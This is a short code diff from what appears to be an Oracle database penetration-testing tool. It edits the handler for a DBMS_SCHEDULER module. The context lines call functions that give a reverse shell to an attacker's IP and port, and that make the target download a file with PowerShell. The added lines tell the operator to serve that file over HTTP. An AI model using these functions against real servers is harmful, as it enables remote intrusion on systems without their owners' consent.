@@ -257,7 +257,8 @@ def runDbmsSchedulerModule(args):
 		dbmsScheduler.giveReverseShell(localip=args['reverse-shell'][0],localport=args['reverse-shell'][1])
 	# Option 2: make target download a local file
 	if args['make-download'] != None:
-		args['print'].title("Try to make the target {0} download local file {1} with powershell, and saved it in {2}".format(args['server'], args['make-download'][0], args['make-download'][1]))
+		args['print'].title("Try to make the target {0} download local file {1} with powershell over http, and saved it in {2}".format(args['server'], args['make-download'][0], args['make-download'][1]))
+		args['print'].printImportantNotice("You have to serve the file according to your path {0} over a http server. 'python -m SimpleHTTPServer PORT' can be used for example ".format(args['make-download'][0]))
 		dbmsScheduler.makeDownloadFile(urlToFile=args['make-download'][0], remoteFilePath=args['make-download'][1])
 	dbmsScheduler.close()
 
